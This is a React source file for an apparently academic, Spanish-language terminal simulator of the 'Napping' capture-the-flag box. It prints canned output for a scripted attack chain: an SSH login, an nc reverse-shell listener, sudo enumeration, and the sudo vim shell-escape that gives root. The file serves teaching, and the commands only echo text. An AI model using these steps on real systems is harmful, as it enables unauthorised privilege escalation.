import React, { useState, useEffect, useRef } from 'react';
import { FaTerminal, FaPlay, FaSkullCrossbones, FaNetworkWired, FaKey, FaLinux, FaExclamationTriangle } from 'react-icons/fa';

const Act12Simulator = () => {
    const [terminalHistory, setTerminalHistory] = useState([]);
    const [terminalInput, setTerminalInput] = useState('');
    const [shellUser, setShellUser] = useState('gisela@kali');
    const [shellPath, setShellPath] = useState('~');
    const terminalContainerRef = useRef(null);

    // Boot sequence
    useEffect(() => {
        const welcomeLogs = [
            `Linux kali 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08) x86_64`,
            `The programs included with the Kali GNU/Linux system are free software;`,
            `the exact distribution terms for each program are described in the`,
            `individual files in /usr/share/doc/*/copyright.`,
            ``,
            `Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent`,
            `permitted by applicable law.`,
            `┌──(gisela㉿kali)-[~]`,
            `└─$ echo "Bienvenido al Simulador de Pentesting - Napping (Escalada de Privilegios)"`,
            `Bienvenido al Simulador de Pentesting - Napping (Escalada de Privilegios)`,
            `[SYS] Escribe 'help' para ver los comandos disponibles para la práctica.`
        ];
        setTerminalHistory(welcomeLogs);
    }, []);

    useEffect(() => {
        if (terminalContainerRef.current) {
            terminalContainerRef.current.scrollTop = terminalContainerRef.current.scrollHeight;
        }
    }, [terminalHistory]);

    const executeCommand = (cmdToExecute) => {
        const rawCmd = cmdToExecute.trim();
        const cmd = rawCmd.toLowerCase();
        let response = [];
        
        if (shellUser === 'gisela@kali') {
            response.push(`┌──(${shellUser})-[${shellPath}]`);
            response.push(`└─$ ${rawCmd}`);
        } else {
            response.push(`${shellUser}:${shellPath}${shellUser.includes('root') ? '#' : '$'} ${rawCmd}`);
        }

        if (cmd) {
            if (cmd === 'help') {
                response.push(
                    `Comandos de simulación disponibles:`,
                    `  help                                   - Muestra este menú.`,
                    `  ssh daniel@192.168.56.103              - Inicia sesión inicial (compromiso inicial).`,
                    `  nc -lvnp 4444                          - Inicia listener para Reverse Shell (ejecutar en kali).`,
                    `  python3 -c 'import pty...'             - Mejora la shell interactiva.`,
                    `  sudo -l                                - Verifica permisos Sudo disponibles.`,
                    `  sudo /usr/bin/vim -c ':!/bin/sh'       - Ejecuta exploit de escalada de privilegios en vim.`,
                    `  whoami                                 - Verifica tu usuario actual.`,
                    `  clear                                  - Limpia la terminal.`
                );
            } else if (cmd === 'clear') {
                setTerminalHistory([]);
                return;
            } else if (cmd.startsWith('ssh daniel@192.168.56.103')) {
                if(shellUser.includes('kali')) {
                    setShellUser('daniel@napping');
                    setShellPath('~');
                    response.push(
                        `The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.`,
                        `ED25519 key fingerprint is SHA256:81h22zyEZGztpKfLu65kzPnsnUUotkuloRYPno8fpN8.`,
                        `This key is not known by any other names.`,
                        `Are you sure you want to continue connecting (yes/no/[fingerprint])? yes`,
                        `Warning: Permanently added '192.168.56.103' (ED25519) to the list of known hosts.`,
                        `** WARNING: Connection is not using a post-quantum key exchange algorithm.`,
                        `daniel@192.168.56.103's password: [Hidden input]`,
                        `Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)`,
                        ` `,
                        `System load:  0.05               Processes:             129`,
                        `Usage of /:   41.2% of 18.57GB   Users logged in:       0`,
                        `Memory usage: 15%                IPv4 address for enp0s3: 192.168.56.103`,
                        `Swap usage:   0%`,
                        ` `,
                        `Last login: Tue Oct 12 00:51:35 2021 from 10.0.2.15`
                    );
                } else {
                     response.push(`bash: ssh: command not found`);
                }
            } else if (cmd.includes('nc -lvnp 4444')) {
                if (shellUser.includes('kali')) {
                    setShellUser('adrian@napping');
                    setShellPath('~');
                    response.push(
                        `listening on [any] 4444 ...`,
                        `connect to [192.168.56.101] from (UNKNOWN) [192.168.56.103] 58004`,
                        `bash: cannot set terminal process group (1822): Inappropriate ioctl for device`,
                        `bash: no job control in this shell`
                    );
                } else {
                    response.push(`nc: Address already in use`);
                }
            } else if (cmd.includes('python3 -c') && cmd.includes('pty.spawn')) {
                response.push(`Interactive pty shell spawned.`);
            } else if (cmd === 'sudo -l') {
                if (shellUser.includes('adrian')) {
                    response.push(
                        `Matching Defaults entries for adrian on napping:`,
                        `    env_reset, mail_badpass,`,
                        `    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin`,
                        ` `,
                        `User adrian may run the following commands on napping:`,
                        `    (root) NOPASSWD: /usr/bin/vim`
                    );
                } else if (shellUser.includes('daniel')) {
                    response.push(
                        `[sudo] password for daniel: `,
                        `Sorry, user daniel may not run sudo on napping.`
                    );
                } else {
                    response.push(`bash: sudo: command not found`);
                }
            } else if (cmd === "sudo /usr/bin/vim -c ':!/bin/sh'") {
                if (shellUser.includes('adrian')) {
                    setShellUser('root@napping');
                    setShellPath('#');
                    response.push(
                        `Vim: Warning: Output is not to a terminal`,
                        `Vim: Warning: Input is not from a terminal`,
                        `E558: Terminal entry not found in terminfo`,
                        `'unknown' not known. Available builtin terminals are:`,
                        `    builtin_ansi`,
                        `    builtin_xterm`,
                        `defaulting to 'ansi'`,
                        ` `
                    );
                } else {
                    response.push(`Sorry, user ${shellUser.split('@')[0]} is not allowed to execute '/usr/bin/vim' as root on napping.`);
                }
            } else if (cmd === 'whoami') {
                if (shellUser.includes('root')) response.push('root');
                else if (shellUser.includes('adrian')) response.push('adrian');
                else if (shellUser.includes('daniel')) response.push('daniel');
                else response.push('gisela');
            } else {
                response.push(`bash: ${cmd}: command not found`);
            }
        }
        
        setTerminalHistory(prev => [...prev, ...response]);
    };

    const handleKeyDown = (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (terminalInput) {
                executeCommand(terminalInput);
            }
            setTerminalInput('');
        }
    };

    const isRoot = shellUser.includes('root');
    const isRemote = !shellUser.includes('kali');

    return (
        <div className="bg-[#050913]/90 border border-emerald-500/20 rounded-3xl overflow-hidden shadow-[0_0_50px_rgba(16,185,129,0.1)] relative mt-8 mb-8">
            {/* Terminal Header */}
            <div className="bg-[#081222]/90 border-b border-emerald-500/10 px-6 py-4 flex items-center justify-between">
                <div className="flex items-center gap-3">
                    <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                        <FaTerminal />
                    </span>
                    <div>
                        <h4 className="text-white font-mono text-xs font-bold tracking-widest uppercase">
                            SIMULADOR - NAPPING PRIVESC
                        </h4>
                        <p className="text-[10px] text-emerald-400/80 font-mono tracking-wider flex items-center gap-1.5 mt-0.5">
                            <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
                            INTERACTIVE SHELL // TARGET: NAPPING UBUNTU
                        </p>
                    </div>
                </div>
            </div>

            {/* Quick Actions / Helpers */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-px bg-emerald-500/20">
                <button type="button" onClick={() => { 
                    executeCommand('ssh daniel@192.168.56.103'); 
                }} className="bg-[#050913] hover:bg-emerald-900/20 text-xs font-mono text-gray-400 py-3 flex items-center justify-center gap-2 transition-colors">
                    <FaNetworkWired className="text-emerald-500" /> 1. SSH Access
                </button>
                <button type="button" onClick={() => { 
                    executeCommand('nc -lvnp 4444');
                }} className="bg-[#050913] hover:bg-emerald-900/20 text-xs font-mono text-gray-400 py-3 flex items-center justify-center gap-2 transition-colors">
                    <FaPlay className="text-blue-500" /> 2. Rev Shell (Adrian)
                </button>
                <button type="button" onClick={() => { 
                    executeCommand('sudo -l');
                }} className="bg-[#050913] hover:bg-emerald-900/20 text-xs font-mono text-gray-400 py-3 flex items-center justify-center gap-2 transition-colors">
                    <FaKey className="text-amber-500" /> 3. Enum Privileges
                </button>
                <button type="button" onClick={() => { 
                    executeCommand("sudo /usr/bin/vim -c ':!/bin/sh'");
                }} className="bg-[#050913] hover:bg-emerald-900/20 text-xs font-mono text-gray-400 py-3 flex items-center justify-center gap-2 transition-colors">
                    <FaSkullCrossbones className="text-red-500" /> 4. Root Exploit
                </button>
            </div>

            {/* Terminal Body */}
            <div className="p-6 bg-[#03060c] h-[450px] flex flex-col font-mono text-xs sm:text-sm shadow-inner relative">
                <div ref={terminalContainerRef} className="flex-grow overflow-y-auto space-y-1.5 scrollbar-thin scrollbar-thumb-emerald-900 pr-2">
                    {terminalHistory.map((line, idx) => {
                        let color = "text-gray-300";
                        if (line.includes('┌──') || line.includes('└─$') || (line.includes('~$') || line.includes('#$'))) color = isRoot ? "text-red-500 font-bold" : "text-emerald-400 font-bold";
                        if (line.includes('[SYS]')) color = "text-cyan-400";
                        if (line.includes('NOPASSWD: /usr/bin/vim')) color = "text-amber-400 bg-amber-900/20 px-1";
                        
                        return (
                            <div key={idx} className={`${color} whitespace-pre-wrap leading-relaxed`}>
                                {line}
                            </div>
                        );
                    })}
                </div>

                <div className="flex items-center gap-2 mt-4 pt-3 border-t border-gray-900 w-full">
                    <span className={isRoot ? "text-red-500 font-bold" : "text-emerald-400 font-bold"}>
                        {isRemote ? `${shellUser}:${shellPath}${isRoot ? '#' : '$'} ` : `┌──(${shellUser})-[${shellPath}]\n└─$ `}
                    </span>
                    <input
                        type="text"
                        value={terminalInput}
                        onChange={(e) => setTerminalInput(e.target.value)}
                        onKeyDown={handleKeyDown}
                        spellCheck="false"
                        className="flex-grow bg-transparent text-white focus:outline-none border-none caret-emerald-400 font-mono text-sm self-end pb-0.5"
                    />
                </div>
            </div>
            <div className="bg-gray-900/50 p-3 text-center border-t border-emerald-500/10">
                <p className="text-[10px] text-gray-500 font-mono uppercase tracking-widest flex items-center justify-center gap-2">
                    <FaLinux /> Simulador Educativo de Vulnerabilidades (Uso Académico)
                </p>
            </div>
        </div>
    );
};

export default Act12Simulator;
